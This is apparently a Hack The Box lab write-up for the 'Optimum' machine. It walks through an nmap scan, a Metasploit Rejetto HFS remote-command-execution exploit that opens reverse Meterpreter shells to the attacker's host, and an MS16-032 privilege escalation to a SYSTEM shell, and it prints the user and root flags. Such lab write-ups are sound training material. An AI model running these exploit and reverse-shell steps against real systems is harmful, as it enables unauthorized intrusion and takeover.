# Optimum
#### 10.10.10.8

```{r, engine='bash', count_lines}
nmap -A -v 10.10.10.8

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Okay lets have a look on it in the browser:

![Alt text](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Optimum/images/Rejetto.png "Rejetto")

Aight we got something called Rejetto Http File Server, let's search metasploit for it.

```{r, engine='bash', count_lines}
msf > search rejetto

Matching Modules
================

   Name                                   Disclosure Date  Rank       Description
   ----                                   ---------------  ----       -----------
   exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution

```

Looks good lets set it up and run the exploit.

```{r, engine='bash', count_lines}
msf exploit(rejetto_hfs_exec) > set RHOST 10.10.10.8
RHOST => 10.10.10.8
msf exploit(rejetto_hfs_exec) > set SRVHOST 10.10.14.14
SRVHOST => 10.10.14.14
msf exploit(rejetto_hfs_exec) > set SRVPORT 12345
SRVPORT => 12345
msf exploit(rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Using URL: http://10.10.14.14:12345/yH9w3c0
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /yH9w3c0
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.8:49170) at 2017-11-07 12:26:46 +0100
[!] Tried to delete %TEMP%\eVEgicCpCnjjP.vbs, unknown result
[*] Server stopped.

meterpreter >
```

Looks like we got **shellz** already.

```{r, engine='bash', count_lines}
meterpreter > cat user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```
However we don't have permissions to cd to Administrator yet.
```{r, engine='bash', count_lines}
meterpreter > cd Administrator
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```

But wait there is something interesting on **sysinfo**


```{r, engine='bash', count_lines}
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
```

Our systems architecture is **x64** but our meterpreter is **x86**. We got to use another payload.
```{r, engine='bash', count_lines}
msf exploit(rejetto_hfs_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.10.10.8       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SRVHOST    10.10.14.14      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    12345            yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(rejetto_hfs_exec) > set LPORT 54321
LPORT => 54321
msf exploit(rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.14:54321
[*] Using URL: http://10.10.14.14:12345/GEQOqoSGSUMq
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /GEQOqoSGSUMq
[*] Sending stage (205379 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.14:54321 -> 10.10.10.8:49176) at 2017-11-07 12:40:25 +0100
[!] Tried to delete %TEMP%\jEZeRuyTmBOALx.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter >
```

Now this looks better, lets try some priv esc.

```{r, engine='bash', count_lines}
meterpreter > background
[*] Backgrounding session 2...
msf exploit(rejetto_hfs_exec) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(ms16_032_secondary_logon_handle_privesc) > set SESSION 2
SESSION => 2
msf exploit(ms16_032_secondary_logon_handle_privesc) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64


msf exploit(ms16_032_secondary_logon_handle_privesc) > set target 1
target => 1
msf exploit(ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf exploit(ms16_032_secondary_logon_handle_privesc) > set LPORT 1337
LPORT => 1337
msf exploit(ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 10.10.14.14:1337
[*] Writing payload file, C:\Users\kostas\Desktop\sSSdsqGiqvCak.txt...
[*] Compressing script contents...
[+] Compressed size: 3588
[*] Executing exploit script...
[*] Command shell session 3 opened (10.10.14.14:1337 -> 10.10.10.8:49178) at 2017-11-07 12:45:06 +0100
[+] Cleaned up C:\Users\kostas\Desktop\sSSdsqGiqvCak.txt

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>
```
Looks good, let's see if we can..
```{r, engine='bash', count_lines}
C:\Users\kostas\Desktop>cd /Users/Administrator/Desktop
cd /Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:14 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  32.754.106.368 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```

GG WP
